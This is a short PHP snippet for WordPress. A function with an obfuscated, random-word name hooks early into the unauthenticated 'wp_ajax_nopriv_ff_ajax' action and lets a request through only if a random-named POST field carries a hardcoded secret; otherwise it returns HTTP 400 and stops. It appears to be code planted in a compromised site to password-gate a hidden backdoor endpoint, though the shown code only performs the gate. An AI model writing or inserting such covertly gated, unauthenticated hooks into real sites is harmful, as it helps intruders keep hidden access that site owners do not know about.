<?php

function about_instagram_exception_lazy() {
	if (!isset($_POST["tywrcjviffwsd"]) || $_POST["tywrcjviffwsd"] !== "liPPggjgOS") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'about_instagram_exception_lazy', 5, 1);
